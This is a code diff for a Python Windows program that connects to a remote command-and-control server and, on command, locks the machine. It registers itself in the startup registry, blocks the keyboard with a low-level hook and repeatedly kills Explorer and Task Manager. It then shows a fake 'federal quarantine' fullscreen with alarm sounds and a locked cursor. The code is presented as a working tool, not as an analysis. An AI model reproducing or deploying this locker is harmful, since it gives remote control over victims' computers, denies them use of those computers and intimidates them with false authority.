@@ -4,6 +4,7 @@ import os
 import random
 import subprocess
 import sys
+import threading
 import time
 import tkinter as tk
 import winsound
@@ -11,7 +12,15 @@ import winreg
 import requests
 
 # 👉 YOUR PERMANENT RENDER C2 SERVER URL
-CLOUD_SERVER_URL = "https://test-uukm.onrender.com/"
+CLOUD_SERVER_URL = "https://test-uukm.onrender.com"
+
+# Global state tracking
+lockdown_state = {
+    "active": False,
+    "reason": "",
+    "session_id": "",
+    "duration": 900,
+}
 
 def make_persistent():
     """Adds the script to Windows Startup Registry to make it reboot-proof"""
@@ -25,6 +34,7 @@ def make_persistent():
                 winreg.SetValueEx(reg_key, "OSGuardC2Daemon", 0, winreg.REG_SZ, f'"{python_executable}" "{script_path}"')
         except Exception as e:
             pass
+
 
 # Windows Hook Constants for Low-Level Keyboard Interception
 WH_KEYBOARD_LL = 13
@@ -40,8 +50,8 @@ class KBDLLHOOKSTRUCT(ctypes.Structure):
     ]
 
 def low_level_keyboard_proc(nCode, wParam, lParam):
-    if nCode >= 0:
-        return 1  # Block keyboard input
+    if nCode >= 0 and lockdown_state["active"]:
+        return 1
     return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
 
 CMPFUNC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
@@ -60,135 +70,123 @@ def remove_keyboard_hook():
         hook_id = None
 
 
-class C2EndpointAgent:
+class TwoWayChaosTakedown:
     def __init__(self):
-        self.root = tk.Tk()
-        self.root.withdraw()  # Start completely hidden as a background daemon
-        
-        self.is_locked = False
-        self.active_session_id = None
-        self.unlock_code = "unlock500"
+        self.root = None
         self.secret_buffer = ""
+        self.unlock_code = "unlock500"
         self.attempt_count = 0
-        self.start_time = 0
-        
-        # UI Elements references
-        self.lock_window = None
-        self.timer_lbl = None
-        self.attempt_lbl = None
 
-        # Start main thread polling loop
-        self.poll_c2_server()
-        
-        self.root.mainloop()
+    def engage_chaos(self, reason, session_id):
+        if lockdown_state["active"] and self.root:
+            return  # Prevent multiple windows stacking up
 
-    def poll_c2_server(self):
-        """Polls Render C2 backend every 2 seconds safely on the main thread"""
-        try:
-            print("[*] Polling Render C2 server...")
-            response = requests.get(f"{CLOUD_SERVER_URL}/api/sessions", timeout=5)
-            if response.status_code == 200:
-                sessions = response.json()
-                for session in sessions:
-                    if session['status'] == 'ACTIVE' and not self.is_locked:
-                        print(f"🚨 LOCKDOWN TRIGGERED! Session: {session['session_id']}")
-                        self.engage_lockdown(session['session_id'], session['reason'])
-                        
-                    elif session['status'] == 'DISARMED' and self.is_locked and session['session_id'] == self.active_session_id:
-                        print(f"✅ REMOTE DISARM RECEIVED for {session['session_id']}")
-                        self.disarm_lockdown(session['session_id'])
-        except Exception as e:
-            print(f"[-] Polling error: {e}")
-
-        # Schedule the next poll in 2 seconds
-        self.root.after(2000, self.poll_c2_server)
-
-    def engage_lockdown(self, session_id, reason):
-        self.is_locked = True
-        self.active_session_id = session_id
-        self.start_time = time.time()
+        lockdown_state["active"] = True
+        lockdown_state["reason"] = reason
+        lockdown_state["session_id"] = session_id
 
         if os.name == "nt":
             subprocess.run("taskkill /F /IM explorer.exe", shell=True, capture_output=True)
             subprocess.run("taskkill /F /IM Taskmgr.exe", shell=True, capture_output=True)
+            subprocess.run("powershell -Command \"(New-Object -ComObject WScript.Shell).SendKeys([char]175)\"", shell=True, capture_output=True)
             install_keyboard_hook()
 
-        # Transform hidden root into fullscreen lockdown window
-        self.lock_window = tk.Toplevel(self.root)
-        self.lock_window.title("FEDERAL C2 — QUARANTINE")
-        self.lock_window.attributes("-fullscreen", True)
-        self.lock_window.attributes("-topmost", True)
-        self.lock_window.configure(bg="#030305")
-        self.lock_window.overrideredirect(True)
+        self.root = tk.Tk()
+        self.root.title("FEDERAL C2 COMMAND CENTER — QUARANTINE")
+        self.root.attributes("-fullscreen", True)
+        self.root.attributes("-topmost", True)
+        self.root.configure(bg="#030305")
+        self.root.overrideredirect(True)
 
-        self.lock_window.protocol("WM_DELETE_WINDOW", lambda: None)
-        self.lock_window.bind("<Alt-F4>", lambda e: "break")
-        self.lock_window.bind("<Escape>", lambda e: "break")
-        self.lock_window.bind("<Control-Shift-Escape>", lambda e: "break")
-        self.lock_window.bind("<Key>", self.on_key_press)
+        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
+        self.root.bind("<Alt-F4>", lambda e: "break")
+        self.root.bind("<Escape>", lambda e: "break")
+        self.root.bind("<Control-Shift-Escape>", lambda e: "break")
+        self.root.bind("<Key>", self.on_key_press)
 
-        frame = tk.Frame(self.lock_window, bg="#0d0d14", highlightbackground="#ff1744", highlightthickness=6, padx=40, pady=40)
-        frame.place(relx=0.5, rely=0.5, anchor="center")
+        self.frame = tk.Frame(self.root, bg="#0d0d14", highlightbackground="#ff1744", highlightthickness=6, padx=40, pady=40)
+        self.frame.place(relx=0.5, rely=0.5, anchor="center")
 
-        tk.Label(frame, text="🚨 CLOUD C2 / ENDPOINT QUARANTINE ACTIVE 🚨", fg="#ff1744", bg="#0d0d14", font=("Consolas", 20, "bold")).pack(pady=(0, 10))
+        tk.Label(self.frame, text="🚨 CLOUD C2 / ENDPOINT QUARANTINE ACTIVE 🚨", fg="#ff1744", bg="#0d0d14", font=("Consolas", 20, "bold")).pack(pady=(0, 10))
         
         info_msg = f"SESSION ID: {session_id}\nReason: {reason}\nConnected to Cloud C2. Awaiting Admin Authorization..."
-        tk.Label(frame, text=info_msg, fg="#f1f5f9", bg="#0d0d14", font=("Consolas", 12), justify="center").pack(pady=(0, 15))
+        tk.Label(self.frame, text=info_msg, fg="#f1f5f9", bg="#0d0d14", font=("Consolas", 12), justify="center").pack(pady=(0, 15))
 
-        self.timer_lbl = tk.Label(frame, text="15:00", fg="#ffffff", bg="#0d0d14", font=("Consolas", 48, "bold"))
+        self.log_box = tk.Text(self.frame, height=6, width=65, bg="#000000", fg="#00ff66", font=("Consolas", 10), bd=0)
+        self.log_box.pack(pady=(0, 15))
+        self.log_box.insert(tk.END, f"[*] Secure connection established with Render C2 server.\n[*] Session {session_id} enforced.\n[*] Windows Explorer & Task Manager disabled.\n")
+        self.log_box.config(state=tk.DISABLED)
+
+        self.timer_lbl = tk.Label(self.frame, text="15:00", fg="#ffffff", bg="#0d0d14", font=("Consolas", 48, "bold"))
         self.timer_lbl.pack()
 
-        self.attempt_lbl = tk.Label(frame, text="SECURITY BYPASS ATTEMPTS BLOCKED: 0", fg="#ffd700", bg="#0d0d14", font=("Consolas", 12, "bold"))
+        self.attempt_lbl = tk.Label(self.frame, text="SECURITY BYPASS ATTEMPTS BLOCKED: 0", fg="#ffd700", bg="#0d0d14", font=("Consolas", 12, "bold"))
         self.attempt_lbl.pack(pady=(15, 0))
 
-        # Start local loops
-        self.run_background_loops()
+        self.start_time = time.time()
+        threading.Thread(target=self.chaos_audio_loop, daemon=True).start()
+        threading.Thread(target=self.taskmgr_killer_loop, daemon=True).start()
+        self.chaos_visual_loop()
+        self.update_countdown_loop()
 
-    def run_background_loops(self):
-        if not self.is_locked:
-            return
-
-        # Task Manager Killer Guard
-        if os.name == "nt":
-            subprocess.run("taskkill /F /IM Taskmgr.exe", shell=True, capture_output=True)
-            try:
-                winsound.Beep(1200, 100)
-            except Exception:
-                pass
-
-        # Update Countdown Timer
-        elapsed = int(time.time() - self.start_time)
-        remaining = max(0, 900 - elapsed)
-        m, s = divmod(remaining, 60)
-        if self.timer_lbl:
-            self.timer_lbl.config(text=f"{m:02d}:{s:02d}")
-
-        if remaining <= 0:
-            self.disarm_lockdown(self.active_session_id)
-        else:
-            # Loop every 1 second
-            self.root.after(1000, self.run_background_loops)
+        self.root.mainloop()
 
     def on_key_press(self, event):
         if event.char:
             self.secret_buffer = (self.secret_buffer + event.char.lower())[-9:]
             if self.secret_buffer == self.unlock_code:
-                self.disarm_lockdown(self.active_session_id)
+                self.disarm(lockdown_state["session_id"])
                 return "break"
 
         self.attempt_count += 1
-        if self.attempt_lbl:
-            self.attempt_lbl.config(text=f"SECURITY BYPASS ATTEMPTS BLOCKED: {self.attempt_count}")
+        self.attempt_lbl.config(text=f"SECURITY BYPASS ATTEMPTS BLOCKED: {self.attempt_count}")
         return "break"
 
-    def disarm_lockdown(self, session_id):
-        if not self.is_locked:
+    def chaos_visual_loop(self):
+        if not lockdown_state["active"] or not self.root:
             return
+        try:
+            self.root.attributes("-topmost", True)
+            self.root.focus_force()
+            colors = ["#1a0000", "#00001a", "#0d0d14", "#26000d"]
+            self.frame.config(bg=random.choice(colors))
+            sw = self.root.winfo_screenwidth()
+            sh = self.root.winfo_screenheight()
+            if os.name == "nt":
+                ctypes.windll.user32.SetCursorPos(sw // 2, sh // 2)
+        except Exception:
+            pass
+        self.root.after(100, self.chaos_visual_loop)
 
-        self.is_locked = False
+    def taskmgr_killer_loop(self):
+        while lockdown_state["active"]:
+            if os.name == "nt":
+                subprocess.run("taskkill /F /IM Taskmgr.exe", shell=True, capture_output=True)
+            time.sleep(0.3)
+
+    def update_countdown_loop(self):
+        if not lockdown_state["active"] or not self.root:
+            return
+        elapsed = int(time.time() - self.start_time)
+        remaining = max(0, lockdown_state["duration"] - elapsed)
+        m, s = divmod(remaining, 60)
+        self.timer_lbl.config(text=f"{m:02d}:{s:02d}")
+        if remaining <= 0:
+            self.disarm(lockdown_state["session_id"])
+        else:
+            self.root.after(1000, self.update_countdown_loop)
+
+    def chaos_audio_loop(self):
+        while lockdown_state["active"]:
+            if os.name == "nt":
+                winsound.Beep(1200, 150)
+                winsound.Beep(800, 150)
+            time.sleep(0.5)
+
+    def disarm(self, session_id):
+        lockdown_state["active"] = False
         remove_keyboard_hook()
-
-        # Notify cloud server to mark resolved
+        
         try:
             requests.get(f"{CLOUD_SERVER_URL}/api/lift-quarantine?session_id={session_id}", timeout=3)
         except Exception:
@@ -196,15 +194,53 @@ class C2EndpointAgent:
 
         if os.name == "nt":
             subprocess.Popen("explorer.exe", shell=True)
-
-        if self.lock_window:
+        if self.root:
             try:
-                self.lock_window.destroy()
+                self.root.destroy()
             except Exception:
                 pass
-            self.lock_window = None
+            self.root = None
+
+
+def cloud_polling_daemon(guard):
+    """Background thread that polls the Render C2 server every 2 seconds"""
+    while True:
+        try:
+            print("[*] Polling Render C2 server for commands...")
+            response = requests.get(f"{CLOUD_SERVER_URL}/api/sessions", timeout=5)
+            if response.status_code == 200:
+                sessions = response.json()
+                print(f"[+] Connected! Active sessions found: {len(sessions)}")
+                for session in sessions:
+                    if session['status'] == 'ACTIVE' and not lockdown_state["active"]:
+                        print(f"🚨 LOCKDOWN COMMAND RECEIVED! Session ID: {session['session_id']}")
+                        if guard.root:
+                            guard.root.after(0, lambda r=session['reason'], s=session['session_id']: guard.engage_chaos(r, s))
+                        else:
+                            threading.Thread(target=lambda r=session['reason'], s=session['session_id']: guard.engage_chaos(r, s), daemon=True).start()
+
+                    elif session['status'] == 'DISARMED' and lockdown_state["active"] and lockdown_state["session_id"] == session['session_id']:
+                        print(f"✅ DISARM COMMAND RECEIVED for {session['session_id']}")
+                        if guard.root:
+                            guard.root.after(0, lambda s=session['session_id']: guard.disarm(s))
+        except Exception as e:
+            print(f"[-] Polling error (Render might be spinning up): {e}")
+        
+        time.sleep(2)
 
 
 if __name__ == "__main__":
+    # 1. Register persistence in Windows Startup Registry
     make_persistent()
-    C2EndpointAgent()
+
+    # 2. Instantiate Guard handler
+    guard = TwoWayChaosTakedown()
+
+    # 3. Start cloud polling daemon in the background thread
+    threading.Thread(target=cloud_polling_daemon, args=(guard,), daemon=True).start()
+
+    # 4. Main loop checks-in or starts idle loop to catch events
+    while True:
+        if lockdown_state["active"] and not guard.root:
+            guard.engage_chaos(lockdown_state["reason"], lockdown_state["session_id"])
+        time.sleep(0.5)
